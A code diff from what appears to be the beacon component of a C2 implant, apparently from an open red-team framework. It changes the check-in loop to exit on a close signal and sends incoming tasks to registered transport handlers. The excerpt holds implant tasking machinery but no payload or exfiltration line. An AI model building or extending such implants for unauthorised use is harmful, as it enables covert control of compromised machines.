@@ -60,23 +60,28 @@ func (t *C2) ServeBeacon() {
 	t.mutex.RUnlock()
 
 	for {
-		// Only exits when we have reached the maximum number
-		// of connection failures for this precise beaconing
-		if t.attempts > int(t.Profile.MaxConnectionErrors) {
+		select {
+		case <-t.closed:
 			return
+		default:
+			// Only exits when we have reached the maximum number
+			// of connection failures for this precise beaconing
+			if t.attempts > int(t.Profile.MaxConnectionErrors) {
+				return
+			}
+
+			duration := t.Duration()
+
+			// Run a beaconing process (connect, set up RPC, process tasks)
+			// In the background so that if tasks do not complete, does not
+			// block any next runs and their associated tasks.
+			go t.HandleBeaconTasks(duration)
+
+			// {{if .Config.Debug}}
+			log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
+			// {{end}}
+			time.Sleep(duration)
 		}
-
-		duration := t.Duration()
-
-		// Run a beaconing process (connect, set up RPC, process tasks)
-		// In the background so that if tasks do not complete, does not
-		// block any next runs and their associated tasks.
-		go t.HandleBeaconTasks(duration)
-
-		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep until %v", time.Now().Add(duration))
-		// {{end}}
-		time.Sleep(duration)
 	}
 }
 
@@ -104,6 +109,7 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 	}
 
 	// Recreate a new, clean session layer when we use beacons.
+	t.Beacon.connection = t.Connection
 	defer t.Connection.Close()
 
 	// {{if .Config.Debug}}
@@ -204,14 +210,25 @@ func (t *C2) ExecuteBeaconTasks(tasks []*pb.Envelope) (results []*pb.Envelope) {
 					Data: data,
 				})
 			})
-			// } else if task.Type == sliverpb.MsgOpenSession {
-			//         go openSessionHandler(task.Data)
-			//         resultsMutex.Lock()
-			//         results = append(results, &sliverpb.Envelope{
-			//                 ID:   task.ID,
-			//                 Data: []byte{},
-			//         })
-			//         resultsMutex.Unlock()
+		} else if handler, ok := transportHandlers[task.Type]; ok {
+			wg.Add(1)
+			var envelope = &pb.Envelope{Data: task.Data}
+			taskID := task.ID
+			go handler(envelope, func(data []byte, err error) {
+				resultsMutex.Lock()
+				defer resultsMutex.Unlock()
+				defer wg.Done()
+				// {{if .Config.Debug}}
+				if err != nil {
+					log.Printf("[beacon] handler function returned an error: %s", err)
+				}
+				log.Printf("[beacon] task completed (id: %d)", taskID)
+				// {{end}}
+				results = append(results, &pb.Envelope{
+					ID:   taskID,
+					Data: data,
+				})
+			})
 		} else {
 			resultsMutex.Lock()
 			results = append(results, &pb.Envelope{
